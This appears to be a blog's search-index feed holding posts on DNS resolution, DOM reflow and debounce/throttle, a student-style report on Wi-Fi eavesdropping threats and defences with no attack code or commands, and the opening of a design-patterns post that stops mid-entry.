<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DNS原理基础</title>
    <url>/2021/11/25/BasicPrincipleofDNS/</url>
    <content><![CDATA[<p><strong>DNS，又称为域名系统（Domain Names System），是一项互联网服务，用于进行域名和与之相对应的IP地址进行转化的服务器。</strong></p>
<a id="more"></a>

<h1 id="Domain-Names-System"><a href="#Domain-Names-System" class="headerlink" title="Domain Names System"></a>Domain Names System</h1><h2 id="一、定义"><a href="#一、定义" class="headerlink" title="一、定义"></a>一、定义</h2><p>DNS用于将域名转换为IP地址。其中：</p>
<ol>
<li>IP地址：一组用点分隔的能唯一标识互联网中的计算机的数字组合</li>
<li>域名：一串用点分隔的名字，用来表示计算机的名称</li>
</ol>
<p><strong>根据《计算机网络》的定义：</strong>DNS是</p>
<ol>
<li><strong>一个由分层的 DNS 服务器实现的分布式数据库</strong></li>
<li><strong>一个使得主机能够查询分布式数据库的应用层协议</strong></li>
</ol>
<h2 id="二、域名构成"><a href="#二、域名构成" class="headerlink" title="二、域名构成"></a>二、域名构成</h2><p><strong>域名是层次结构，从上到下（从书写上看是从右到左），分为根域名、顶级域名、二级域名、三级域名等等。</strong></p>
<blockquote>
<ol>
<li><p>根域名：root</p>
<ol start="2">
<li><blockquote>
<p>顶级域名：net, com, edu, org…</p>
<ol start="3">
<li><blockquote>
<p>二级域名：ibm, baidu, alibaba, ….</p>
<ol start="4">
<li><blockquote>
<p>三级域名：www, mail, …</p>
</blockquote>
</li>
</ol>
</blockquote>
</li>
</ol>
</blockquote>
</li>
</ol>
</li>
</ol>
</blockquote>
<p>注意：在域名的每一个层级都有一个域名服务器，如果顶级域名中，有edu域名服务器，com域名服务器。</p>
<p>从上面可以看出，DNS 系统是一个典型的树状结构，从根域名服务器开始一级一级的查询。根服务器用于一切域名的起始解释权，通过下图可以大致了解解释权机制（SOA）。</p>
<p><img src="/cover/dns.jpg" alt="DNS"></p>
<h2 id="三、查询方式"><a href="#三、查询方式" class="headerlink" title="三、查询方式"></a>三、查询方式</h2><ul>
<li>递归查询：A只请求B，直到B返回A想要的结果。</li>
<li>迭代查询：A请求B，B返回结果告知A所需要请求的其他服务器，然后A再请求C、D、E等并拿到响应的返回结果。</li>
</ul>
<h2 id="四、域名缓存"><a href="#四、域名缓存" class="headerlink" title="四、域名缓存"></a>四、域名缓存</h2><ul>
<li><p>对于域名服务器而言：</p>
<blockquote>
<p>在首次进行解析域名时，会使用缓存保存域名和对应的IP地址映射。</p>
</blockquote>
</li>
<li><p>对于本地计算机而言：</p>
<ul>
<li><p>对于浏览器：</p>
<blockquote>
<p>浏览器会在获取网站域名的实际IP后，用缓存保存下来，以减少网络请求次数</p>
</blockquote>
</li>
<li><p>对于操作系统：</p>
<blockquote>
<p>操作系统的缓存就是用户自己配置的hosts文件</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h2 id="五、查询过程"><a href="#五、查询过程" class="headerlink" title="五、查询过程"></a>五、查询过程</h2><p>大致有七个步骤：</p>
<ol>
<li><p>首先搜索浏览器的DNS缓存，其缓存中维护了一张域名与IP地址的对应表，若有则返回，并结束操作</p>
</li>
<li><p>若没有找到，继续搜索操作系统的DNS缓存，若有则返回，并结束操作</p>
</li>
<li><p>若没找到，则操作系统把域名发给本地域名服务器，本地域名服务器在自己的DNS缓存中采用递归方式查找，若有则返回，并结束操作</p>
</li>
<li><p>若没找到，则本地服务器向上级域名服务器进行迭代查询</p>
<blockquote>
<ol>
<li>本地域名服务器向根域名服务器发送请求，其会返回顶级域名服务器地址</li>
<li>本地域名服务器再向顶级域名服务器发送请求，其会返回二级域名服务器地址</li>
<li>本地域名服务器再向二级域名服务器发送请求，最终返回该域名对应的IP地址</li>
</ol>
</blockquote>
</li>
</ol>
<hr>
<p>至此，请求阶段完成，接下来分三步返回结果至浏览器并缓存。</p>
<ol start="5">
<li>本地域名服务器将得到的IP地址返回给操作系统，同时缓存该域名与IP的映射</li>
<li>操作系统将得到的IP地址返回给浏览器，同时缓存该域名与IP的映射</li>
<li>浏览器得到该域名对应的IP地址，同时缓存该域名与IP的映射</li>
</ol>
<h2 id="六、DNS-负载均衡基本原理"><a href="#六、DNS-负载均衡基本原理" class="headerlink" title="六、DNS 负载均衡基本原理"></a>六、DNS 负载均衡基本原理</h2><p>DNS 也用于在冗余的服务器之间进行负载分配。繁忙的站点（例如cnn.com）被冗余分布在多台服务器上，每台服务器均运行在不同的端系统上，每个都有着不同的 IP 地址。</p>
<p>DNS 服务器为同一个主机名/域名配置了多个 IP 地址，在应答 DNS 查询时，DNS 服务器对每个查询将以 DNS 文件中主机记录对应的 IP 地址按顺序返回不同的解析结果，将客户端访问引导到不同的机器上去，使得不同的客户端访问不同的服务器，从而达到负载均衡的目的。</p>
]]></content>
      <categories>
        <category>FrontEnd/前端</category>
      </categories>
      <tags>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>DOM &amp; BOM</title>
    <url>/2021/11/04/DOM&amp;BOM/</url>
    <content><![CDATA[<p><strong>本章主要介绍DOM概念、操作DOM的代价、浏览器渲染引擎的机制，性能优化以及节流和防抖等常见面试题。</strong></p>
<a id="more"></a>

<h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><h2 id="1-什么是DOM"><a href="#1-什么是DOM" class="headerlink" title="1. 什么是DOM"></a>1. 什么是DOM</h2><p><code>DOM</code>就是<code>Document Object Model</code>，<strong>文档对象模型</strong>，里边是接口，即方法函数。</p>
<p>官方定义：DOM是一个**独立于语言的、用于操作XML和HTML文档的程序接口(API)**。在浏览器中主要用于与HTML文档打交道，并且使用DOM API用来访问文档中的数据。<br>DOM是个与ES语言无关的API，它在浏览器中的接口却是用JavaScript来实现的，DOM就成了现在JS编码中的重要部分。</p>
<h2 id="2-JS修改DOM元素代价很高"><a href="#2-JS修改DOM元素代价很高" class="headerlink" title="2. JS修改DOM元素代价很高"></a>2. JS修改DOM元素代价很高</h2><p>每次操作DOM之前，就会先<strong>访问DOM</strong>，所以也会消耗性能。<br>在此基础上，因为<strong>修改DOM</strong>会导致浏览器重新计算页面的几何变化、引发浏览器模板引擎的<strong>重排</strong>(回流 - 回滚流程)和<strong>重绘</strong>，进而更加消耗性能。</p>
<h2 id="3-浏览器渲染引擎的工作原理和流程"><a href="#3-浏览器渲染引擎的工作原理和流程" class="headerlink" title="3. 浏览器渲染引擎的工作原理和流程"></a>3. 浏览器渲染引擎的工作原理和流程</h2><p>浏览器下载完页面中的所有资源（比如HTML、JavaScript、CSS、图片等）后，会发生如下的6步过程：</p>
<ol>
<li><p>解析HTML，构建DOM树（DOM Tree）</p>
</li>
<li><p>解析CSS，生成CSS规则树（CSSOM Tree）</p>
</li>
<li><p>合并DOM树和CSS规则树，生成渲染树render树（render Tree）</p>
</li>
<li><p>布局render树，根据生成的render树来对各元素尺寸、位置进行计算，得到每个节点的几何信息。（根据视口的大小来计算元素的位置和大小）（重排会走这一步）</p>
</li>
<li><p>绘制render树，绘制页面像素信息（根据render树上每个节点的几何信息，得到每个节点的像素数）（重绘会走这一步）</p>
</li>
<li><p>浏览器会将各层节点的像素信息发送给GPU，GPU将各层合成、绘制展示到页面上</p>
</li>
</ol>
<h3 id="3-1-浏览器渲染引擎是如何生成渲染树（render-Tree）的？"><a href="#3-1-浏览器渲染引擎是如何生成渲染树（render-Tree）的？" class="headerlink" title="3.1 浏览器渲染引擎是如何生成渲染树（render Tree）的？"></a>3.1 浏览器渲染引擎是如何生成渲染树（render Tree）的？</h3><ol>
<li>从DOM Tree的根节点开始遍历每一个可见节点（除meta、link、script等这些标签；除display:none;的元素）</li>
<li>对于每个可见节点，在CSSOM中找到对应规则并将样式规则应用到对应节点上。</li>
<li>根据每一个可见节点，以及其对应的样式，组合生成渲染树。</li>
</ol>
<p><strong>不可见节点：</strong> 不会渲染输出的节点（不会显示在屏幕上的节点）有以下几种</p>
<ul>
<li>meta、link、script等标签;</li>
<li>通过css进行隐藏的节点，即display:none；（opacity对人类不可见，计算机还能看见，所以还会渲染。）（那visibility为隐藏的元素会不会被渲染呢？做个试验，一个div设置visibility不可见，左浮动，周围全是文字，看文字环绕是否让出一块空白区域。最后试验证明确实绕出了一段空白的位置，说明visibility和opacity设置的不可见只是对人类肉眼不可见，计算机还是会在生成render Tree的时候计算位置信息并把他绘制出来。试验结果如下图:)</li>
</ul>
<h2 id="4-什么是浏览器渲染引擎的重排和重绘？"><a href="#4-什么是浏览器渲染引擎的重排和重绘？" class="headerlink" title="4. 什么是浏览器渲染引擎的重排和重绘？"></a>4. 什么是浏览器渲染引擎的重排和重绘？</h2><h3 id="4-1-重排"><a href="#4-1-重排" class="headerlink" title="4.1 重排"></a>4.1 重排</h3><p>当<strong>DOM的变化影响了元素的几何属性（宽、高和位置）</strong>，浏览器需要重新计算元素的几何属性，同样其他相邻元素的几何属性和<strong>位置</strong>也会因此受到影响。浏览器会使渲染树中受到影响的部分失效，并重新构造渲染树。这个过程称为“重排”。</p>
<h3 id="4-2-重绘"><a href="#4-2-重绘" class="headerlink" title="4.2 重绘"></a>4.2 重绘</h3><p>完成重排后，浏览器会重新绘制受影响的部分到屏幕中，该过程称为<strong>重绘</strong>。<br>因为重排在重绘的上一步，所以<strong>重排发生后自然会导致重绘</strong>。</p>
<h2 id="5-什么时候会引发重排？"><a href="#5-什么时候会引发重排？" class="headerlink" title="5. 什么时候会引发重排？"></a>5. 什么时候会引发重排？</h2><p>当页面布局和几何属性改变时就需要重排：<br>（核心就是：只要某个属性能导致位置信息发生改变，就会触发重排 ）</p>
<ol>
<li><p>添加或删除可见的DOM元素。(一堆人排队，添加即中间插入了一个人/删除即中间一个人走了，势必会影响后边排队的人的位置信息也发生改变)</p>
</li>
<li><p>元素位置改变（重排就是因为位置信息改变了）</p>
</li>
<li><p>元素尺寸改变( 外边距、内边距、边框厚度、宽度、高度等)</p>
</li>
<li><p>内容改变，例：文本数量/内容改变、或图片被另一个不同尺寸的图片替代、字体大小改变、（文字加粗？）导致DOM元素位置、面积改变。【计算会消耗CPU的能力】</p>
</li>
<li><p>页面渲染器初始化（这算重走流程吧，肯定要重排）</p>
</li>
<li><p>浏览器窗口尺寸改变（位置信息会被迫调整，发生重排。见下图的gif图，一个页面中div元素的位置不受视口调整而修改，也会引发重排）【消耗GPU的计算能力】。试验：resize视口，一个页面中div元素的位置不受视口调整而修改，也会引发重排</p>
</li>
</ol>
<h2 id="6-什么时候会引发重绘？"><a href="#6-什么时候会引发重绘？" class="headerlink" title="6. 什么时候会引发重绘？"></a>6. 什么时候会引发重绘？</h2><ol>
<li><p><strong>重排必然引发重绘</strong>，这是肯定的。因为浏览器的工作流程就是排版后渲染。重排会回流（回滚流程）到排版阶段，排版后需要重新绘制页面。</p>
</li>
<li><p>单独触发重绘的情况：<br>除元素尺寸、位置发生改变以外的情况，（比如字体颜色、背景色等发生改变）。（我怀疑文字加粗也会触发重排，但是我没有证据。理论上来说如果在一个固定尺寸的div内加粗文字，应该不会影响后边元素的重排，但可能该div内部的其他相邻文字或元素会发生重排。）</p>
</li>
</ol>
<h2 id="7-浏览器的性能优化"><a href="#7-浏览器的性能优化" class="headerlink" title="7. 浏览器的性能优化"></a>7. 浏览器的性能优化</h2><h3 id="7-1-优化"><a href="#7-1-优化" class="headerlink" title="7.1 优化"></a>7.1 优化</h3><p>现代浏览器是相当完善的了，因为多次操作DOM会触发重排重绘、消耗性能。所以除了我们人为的、有意识的去控制操作DOM次数以外，浏览器在设计上进行了优化，也会智能的“节流”操作DOM，比如实现队列化修改、批量执行。</p>
<p>解释来说就是，<strong>浏览器会有一个“队列”，用以存放（攒着）需要操作DOM的js程序。每当执行一次js操作dom的代码，这个队列里就先暂存一个程序。等到一段时间后，浏览器再集中、批量的链接一次”ES岛”和”DOM岛”（就是让JS引擎去链接渲染引擎），进而触发一次DOM操作。</strong>你可以形象的理解为“过一段时间发一班车”。</p>
<h3 id="7-2-用户打断优化的操作"><a href="#7-2-用户打断优化的操作" class="headerlink" title="7.2 用户打断优化的操作"></a>7.2 用户打断优化的操作</h3><p>但是我们人类感知不到啊，可能会因为误操作打断浏览器的“节流”步骤。迫使浏览器中断当前的“等待”，去赶紧、立马进行一次dom操作。让浏览器赶紧执行完他攒在“队列”里的JS操作DOM的程序后返回最新的DOM位置信息给我们。这就好像电梯门定时自动关闭，但是你却手动按了关门按钮强迫关门一样。</p>
<p>这种情况就发生在我们获取DOM信息的时候：</p>
<p><strong>打断浏览器优化，强迫触发重排的属性：</strong></p>
<blockquote>
<p>offsetTop、offsetLeft、offsetWidth、offsetHeight<br>scrollTop、scrollLeft、scrollWidth、scrollHeight<br>clientTop、clientLeft、clientWidth、clientHeight<br>getComputedStyle()</p>
</blockquote>
<p><strong>因为要跟浏览器请求最新的DOM信息，所以浏览器就得赶紧让JS引擎去渲染引擎那里进行一次DOM操作。</strong></p>
<h2 id="8-为什么操作DOM非常昂贵？"><a href="#8-为什么操作DOM非常昂贵？" class="headerlink" title="8. 为什么操作DOM非常昂贵？"></a>8. 为什么操作DOM非常昂贵？</h2><ol>
<li>ES和 DOM是两种东西，每次连接都需要消耗性能</li>
<li>操作DOM会导致重排和重绘，重排会占用、消耗CPU; 重绘会占用、消耗GPU</li>
</ol>
<h2 id="9-防抖-amp-节流-—-源自思否-安歌"><a href="#9-防抖-amp-节流-—-源自思否-安歌" class="headerlink" title="9. 防抖 &amp; 节流 — 源自思否-安歌"></a>9. 防抖 &amp; 节流 — 源自思否-安歌</h2><h3 id="9-1-解释"><a href="#9-1-解释" class="headerlink" title="9.1 解释"></a>9.1 解释</h3><p>案例：<strong>大多网站会提供这么一个按钮：用于返回顶部。</strong></p>
<p>这个按钮只会在滚动到距离顶部一定位置之后才出现，那么我们现在抽象出这个功能需求– <strong>监听浏览器滚动事件，返回当前滚条与顶部的距离</strong>。可以用一个函数实现。</p>
<p>但是，在运行的时候会发现存在一个问题：<strong>这个函数的默认执行频率，太！高！了！。</strong> 高到什么程度呢？以chrome为例，我们可以点击选中一个页面的滚动条，然后点击一次键盘的【向下方向键】，会发现函数执行了<strong>8-9次</strong>！</p>
<p>然而实际上我们并不需要如此高频的反馈，毕竟浏览器的性能是有限的，不应该浪费在这里，所以接着讨论如何优化这种场景。</p>
<h3 id="9-2-防抖（debounce）"><a href="#9-2-防抖（debounce）" class="headerlink" title="9.2 防抖（debounce）"></a>9.2 防抖（debounce）</h3><p><strong>简言之，防抖是如果在短时间内大量触发相同事件，不立即执行，而是等待一个给定时间段后再执行，如果给定时间内又触法该事件则重新计时</strong></p>
<p>基于上述场景，首先提出第一种思路：<strong>在第一次触发事件时，不立即执行函数，而是给出一个期限值比如200ms</strong>，然后：</p>
<ul>
<li>如果在200ms内没有再次触发滚动事件，那么就执行函数</li>
<li>如果在200ms内再次触发滚动事件，那么当前的计时取消，重新开始计时</li>
</ul>
<p><strong>效果</strong>：如果短时间内大量触发同一事件，只会执行一次函数。</p>
<h3 id="9-3-节流（throttle）"><a href="#9-3-节流（throttle）" class="headerlink" title="9.3 节流（throttle）"></a>9.3 节流（throttle）</h3><p><strong>简言之，节流是如果在短时间内大量触发相同事件，即每隔相同一段时间执行一次</strong></p>
<p>继续思考，使用上面的防抖方案来处理问题的结果是：</p>
<ul>
<li>如果在限定时间段内，不断触发滚动事件（比如某个用户闲着无聊，按住滚动不断的拖来拖去），只要不停止触发，理论上就永远不会输出当前距离顶部的距离。</li>
</ul>
<p>新需求：<strong>即使用户不断拖动滚动条，也能在某个时间间隔之后给出反馈呢？</strong></p>
<p>其实很简单：我们可以设计一种<strong>类似控制阀门一样定期开放的函数，也就是让函数执行一次后，在某个时间段内暂时失效，过了这段时间后再重新激活</strong>（类似于技能冷却时间）。</p>
<p><strong>效果</strong>：如果短时间内大量触发同一事件，那么<strong>在函数执行一次之后，该函数在指定的时间期限内不再工作</strong>，直至过了这段时间才重新生效。</p>
]]></content>
      <categories>
        <category>FrontEnd/前端</category>
      </categories>
      <tags>
        <tag>DOM</tag>
      </tags>
  </entry>
  <entry>
    <title>Eavesdropping and Packet Sniffing over Wi-Fi</title>
    <url>/2022/11/18/EavesdroppingAndPacketSniffingOverWi-Fi/</url>
    <content><![CDATA[<p><strong>This report illustrates the eavesdropping and packet sniffing over Wi-Fi networks, one of the most common attacks. It will focus on the threats and some popular solutions of Wi-Fi eavesdropping.</strong></p>
<a id="more"></a>

<h1 id="Eavesdropping-and-packet-sniffing-over-Wi-Fi"><a href="#Eavesdropping-and-packet-sniffing-over-Wi-Fi" class="headerlink" title="Eavesdropping and packet sniffing over Wi-Fi"></a>Eavesdropping and packet sniffing over Wi-Fi</h1><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>This report illustrates the eavesdropping and packet sniffing over Wi-Fi networks, one of the most common attacks. It will focus on the threats and some popular solutions of Wi-Fi eavesdropping. It will begin from the definition of Wi-Fi eavesdropping, passing by posting some threats of the confidentiality attack and what will be at risk from this attack, through mentioning the principles that the Wi-Fi eavesdropping is based on and some common preventative measures in order to secure the network and show what we can do to protect our Wi-Fi. At the end, a brief conclusion will be given.</p>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Eavesdropping is an action of spying on personal information and the victims can’t realize that. It’s the confidentiality attack that usually takes place on the internet. Wi-Fi eavesdropping focuses on capturing, recombining and reading the data packets which are transmitted between devices on the internet. Wi-Fi eavesdropping usually takes the form of packet sniffing to achieve their purpose. Packet sniffing is the process of collecting and gathering all the data packets regardless of the destination address of these packets. This type of technology can be legal or illegal which depends on who uses it. For example, the government will use this technology to detect if any criminal events exist on the internet and it’s legal. But black-hat hackers can also utilize it to intercept some sensitive information which is illegal. This report will focus on the illegal events and their influences.</p>
<p>Before discussing threats resulting from eavesdropping, we need to figure out the principle of Wi-Fi eavesdropping firstly. Wi-Fi eavesdropping can also be called packet sniffing in a way. According to Ethernet protocol, every data packet has a header which should include the destination physical address and each node on the network can find it but only the node who has the same address as the packet will receive it. However, using some tools can set the network interface setting to the monitor mode, which will allow this node to receive any packet regardless of the destination physical address. Therefore, Wi-Fi eavesdropping just utilizes this principle to sniff every packet potentially, which means it’s very difficult for general users to find whether they are being eavesdropped.</p>
<h2 id="Security-threats-from-Wi-Fi-eavesdropping"><a href="#Security-threats-from-Wi-Fi-eavesdropping" class="headerlink" title="Security threats from Wi-Fi eavesdropping"></a>Security threats from Wi-Fi eavesdropping</h2><p>The personal privacy will be exposed to the attackers if the bad guy successfully sniffs the packets. For example, public Wi-Fi is very common in the modern society, especially in the coffee bar like Starbucks. If you and the attacker are under the same public Wi-Fi, your data packets are vulnerable to this interception. Particularly, if your data packets are not encrypted in certain way, like you just unencrypted HTTP to visit some websites and submit some tables, then your personal information will be more likely to leak, such as the websites you are accessing, user name and password, what you download and even all your emails. </p>
<p>The business information might be stolen by black-hat hackers, especially some sensitive business information which will result in money loss or even company bankruptcy. For instance, in a big company an employee is an attacker who put a packet sniffer on the internal network to eavesdrop some sensitive data like financial data which will cause a big crisis of the company. After that, it might lead to job loss and even trigger some social problems in some small areas.</p>
<p>Besides, if a technical corporation makes a mistake on its products, it will not only affect itself like company future and share price, but also hundreds of thousands of users who own its products, which even cause a huge panic in the society. For example, according to cnet website news, in 2019 a smart video ring created by Amazon company was found to have vulnerability leaking Wi-Fi login information. (Alfred, 2019) The leaking happens when you first set your ring device. It will send the sensitive information such as Wi-Fi username and password in the plain form, which shows that everyone can see the information and even successfully enter your network and eavesdrop all your information on the network. That sounds horrible but it’s true.  </p>
<p>In some cases, eavesdropping attack could lead to a big social event. According to an essay in UKESSAYS, over 55,000 wireless routers’ passwords are compromised due to the user bad habit that they don’t change the default password, which gives the eavesdroppers a chance to catch their data easily. [2] This case shows that many users are lack of network security awareness and it will let Wi-Fi eavesdropping become easier.</p>
<h2 id="Why-is-Wi-Fi-so-vulnerable-to-compromise"><a href="#Why-is-Wi-Fi-so-vulnerable-to-compromise" class="headerlink" title="Why is Wi-Fi so vulnerable to compromise?"></a>Why is Wi-Fi so vulnerable to compromise?</h2><p>The most important reason is that most of users around the world don’t develop the awareness about how important network security is and how to protect their data on the internet. If users don’t know the basic knowledge of network, it will be difficult for them to know how to protect their sensitive information.</p>
<p>Another reason is that Wi-Fi is different from wired network. Particularly, the public Wi-Fi offer everyone to access, which also allow attackers to access. It will be easier for eavesdroppers to find your devices and intercept your data since you and attackers are under the same network.</p>
<p>Although cyber security has developed for many years, the only way to prevent us from eavesdropping is encryption. However, unfortunately, even if we use the encryption technology to secure our data, attackers still can capture data packet but in its encrypted form which also makes it possible to decipher data by using some other technologies.</p>
<p>Last but not least, if we see the history of Wi-Fi, it’s not difficult to find Wi-Fi security problems. At the beginning, WEP was developed as the first version of Wi-Fi, but people find WEP has many security flaws after using it for a while. And then WAP was created to enhance the security as a temporary measure. But WPA was just a upgrade version of WEP and people found it was vulnerable to attack. Finally, WPA2 with advanced encryption standard was established to replace the previous protocols since WPA2 is secure enough to protect home network, but attackers still can use Wi-Fi Protected Setup to intrude into the network although it might take them about 10 hours.[3] In short, it is shown clearly that Wi-Fi itself has some inherent flaws actually and we can’t guarantee it will protect our privacy easily.</p>
<h2 id="Common-solutions-to-eavesdropping"><a href="#Common-solutions-to-eavesdropping" class="headerlink" title="Common solutions to eavesdropping"></a>Common solutions to eavesdropping</h2><p>There are lots of ways to prevent data packets from sniffing, but the core of most measures is encryption and the difference between them is the way of encryption. In addition, there are also some indirect ways to reduce the possibility and effect of suffering from Wi-Fi eavesdropping.</p>
<h3 id="Encryption"><a href="#Encryption" class="headerlink" title="Encryption"></a>Encryption</h3><p>In terms of encryption, the most effective way is using virtual private network(VPN) and HTTPS to surf. First, Using plain HTTP will not provide you any encryption service which means your transmitting data packets are completely exposed to anyone on the network. Compared with that, HTTPS has an additional ‘S’ which means SSL. HTTPS uses SSL to encrypt HTTP requests and responses and makes data safer than HTTP. According to the experiment of Jon Watson, he separately use HTTP, HTTPS and VPN to visit a website and use a packet sniffer called Wireshark to capture his own data. The result shows that when using HTTP, he can sniff all the packets and see all information including his username, password and his destination website, but when using HTTPS, he can also sniff all data packets but in the encrypted form and he just can see the website that he wants to visit, and when using VPN, he can only know a bunch of encrypted data sent to the Open VPN server. Hence, this experiment illustrates that HTTP is not secure and HTTPS is better but not as good as VPN. And it also indicates that using VPN means that you need to trust your VPN server since they can decipher your sending to see your data. So besides using VPN, we still need to use HTTPS that can protect our data from VPN server because even if they decipher our data packets, they will find data is still encrypted by HTTPS. ( Jon, 2018) From this point of view, the combination of HTTPS and VPN seems to be a best choice for most users.</p>
<p>In addition, for some special users such as the government and big company, the methods mentioned above are obviously not safe enough. Therefore, another enhanced encryption called military-grade encryption will meet their requirement. Due to using a 256-bit encryption, even if data packets are sniffed by others successfully, it will take over 5,000 years to decipher them. Generally, this military-grade encryption is a great way to defend packet sniffing. But it is often used in some special area and not very widespread.</p>
<p>Last but not least, the special encryption I really want to mention is end-to-end encryption technology. If we want to explain this technology clearly, we need to talk a little about hop-by-hop encryption. According to Dan York, hop-by-hop uses SSL encryption to ensure the security of the transmission between the user and the server. But unfortunately, when data stream arrives in the server, the protection will disappear because the server need to decode them to get some necessary information, which also provides hackers some chances. (Dan, 2010) If the server is hacked by other tools, the information of every user through this server will be dumped out on the internet. Hence, in order to make data packets safer, we introduce this technology called end-to-end encryption. It only allows both of sender and receiver to decipher the data, which means only the two side have the decryption key except others and even the server. Therefore, there is no way to see this information in its decrypted form. But suppose there is a back door here and the hacker find it, they will have the ability to eavesdrop all the information. In short, end- to-end encryption provides a higher level of security to protect our data, however, packets still could be stolen through the combination of packet sniffing and other technologies.</p>
<h3 id="Other-indirect-measures"><a href="#Other-indirect-measures" class="headerlink" title="Other indirect measures"></a>Other indirect measures</h3><p>In terms of indirect way, there are some common solutions including turning off SSID broadcasting, disabling DHCP, and network segmentation.</p>
<p>Firstly, SSID is service set identifier which is the name of your wireless network. Many routers set SSID broadcast as a default setting. If you turn off your SSID broadcast, other users’ terminal devices can’t find your network. However, hiding your network name doesn’t represent it disappearance in fact. It does exist actually, which means hackers still can find it. Some programs such as NetStumbler can help them easily locate your network. Consequently, it will only work for those inexperienced users and be useless for most hackers. (Paul, 2019)</p>
<p>Secondly, DHCP is dynamic host configuration protocol. If you disable DHCP, your router will not give any devices IP automatically. Instead, you need to configure your device IP and then the router will recognize it. This measure can prevent hackers from entering your router as they don’t know your router internal IP and can’t configure their device IP. But the premise is that you have changed your router default IP which can make it hardly possible for hackers to guess your IP. (Miguel, 2014) Therefore, it will work but also lead to some inconvenient access for your own devices.</p>
<p>Finally, network segmentation is a structural approach which can divide a network into many independent subnets and every subnet is an individual network. For example, in business network, if employees are in one subnet, they will not be authorized to access other sensitive subnets, which also reduce the possibility of eavesdropping attack. Since a hacker use phishing or other ways to control one employee’s computer, he still can’t use the packet sniffer to capture some valuable information in different subnet. From pure security point of view, this measure will reduce the attack risk obviously. Nevertheless, once the hackers decide to capture the information, they will try to comprise many users in the business company, which means it’s still possible to eavesdrop sensitive information.</p>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This report presents the definition and principle of Wi-Fi eavesdropping in a simple way and illustrates eavesdropping’s threats and how to protect us from them in detail. </p>
<p>As I show in the report, the majority of threats is information leak including private information, sensitive business strategies and confidential government policies. The worst effect of threats is leading to a social event and people’s panic and the smallest consequence is individual privacy disclosure. Either of these results is serious, hence, we need to take some measures to avoid suffering from packet sniffing.</p>
<p>In my opinion, all the measures can be divided into two types. One is direct solution called encryption. The other is indirect solution including network segmentation etc. Compared with indirect solution, encryption is the most effective measure to prevent eavesdropping attacks, especially military grade encryption and end-to-end encryption because it is very difficult for hackers to decode them through either spending long time or finding a backdoor. And improving the network security awareness of users is also very significant since many attacks just use very simple method and are easy to avoid. Besides, other measures can also be taken into consideration as they are able to help users reduce the possibility of eavesdropping obviously.</p>
<p>At the end, with the development of Wi-Fi, people can’t live and work without it although it still brings us some security problems. We are expecting some key technological breakthroughs to avoid illegal Wi-Fi eavesdropping well.</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] Alfred, Ring doorbells had vulnerability leaking Wi-Fi login info, 2019 </p>
<p><a href="https://www.cnet.com/news/ring-doorbells-had-vulnerability-leaking-wi-fi-login-info-researchers-found/">https://www.cnet.com/news/ring-doorbells-had-vulnerability-leaking-wi-fi-login-info-researchers-found/</a></p>
<p>[2]<a href="https://www.ukessays.com/essays/computer-science/wifi-eavesdropping-attack-overview-and-challenegs.php">https://www.ukessays.com/essays/computer-science/wifi-eavesdropping-attack-overview-and-challenegs.php</a></p>
<p>[3] <a href="https://www.netspotapp.com/wifi-encryption-and-security.html">https://www.netspotapp.com/wifi-encryption-and-security.html</a></p>
<p>[4] Jon,What is packet sniffing and how can you avoid it?, 2018 </p>
<p><a href="https://www.comparitech.com/blog/information-security/what-is-packet-sniffing/">https://www.comparitech.com/blog/information-security/what-is-packet-sniffing/</a></p>
<p>[5] Dan, Seven Deadliest Unified Communications Attacks, Chapter 3, Page 61, 2010</p>
<p><a href="https://cdn.ttgtmedia.com/searchUnifiedCommunications/downloads/Seven_Deadliest_UC_Attacks_Ch3.pdf">https://cdn.ttgtmedia.com/searchUnifiedCommunications/downloads/Seven_Deadliest_UC_Attacks_Ch3.pdf</a></p>
<p>[6] Paul, How to disable SSID broadcast to hide your Wi-Fi, 2019 </p>
<p><a href="https://nordvpn.com/blog/how-to-disable-ssid-broadcast/">https://nordvpn.com/blog/how-to-disable-ssid-broadcast/</a></p>
<p>[7] Miguel, Does Disabling DHCP on Your Router Really Help Your Security?, 2014 </p>
<p><a href="https://www.maketecheasier.com/does-disabling-dhcp-improve-security/">https://www.maketecheasier.com/does-disabling-dhcp-improve-security/</a></p>
]]></content>
      <categories>
        <category>CyberSecurity</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>10 Design Patterns</title>
    <url>/2022/03/11/10DesignPatterns/</url>
    <content><![CDATA[<h1 id="10-Design-Patterns"><a href="#10-Design-Patterns" class="headerlink" title="10 Design Patterns"></a>10 Design Patterns</h1><h2 id="1-Category"><a href="#1-Category" class="headerlink" title="1. Category"></a>1. Category</h2><ol>
<li><strong>Creational Design Pattern</strong> — How objectes are created<ul>
<li>Singleton Design Pattern</li>
<li>Prototype</li>
<li>Builder</li>
<li>Factory</li>
</ul>
</li>
<li><strong>Structural Design Pattern</strong> — How objects are related to each other<ul>
<li>Facade Design Pattern</li>
<li>Proxy</li>
</ul>
</li>
<li><strong>Behavioral Design Pattern</strong> — How objects communicate with each other<ul>
<li>Iterator Design Pattern</li>
<li>Observer</li>
<li>Mediator</li>
<li>State</li>
</ul>
</li>
</ol>
<h2 id="2-Creational-Pattern"><a href="#2-Creational-Pattern" class="headerlink" title="2. Creational Pattern"></a>2. Creational Pattern</h2><h3 id="2-1-Singleton"><a href="#2-1-Singleton" class="headerlink" title="2.1. Singleton"></a>2.1. Singleton</h3><p><strong>It’s a type of object that cam only be instantiated once.</strong></p>
<p>A singleton eample in TS:</p>
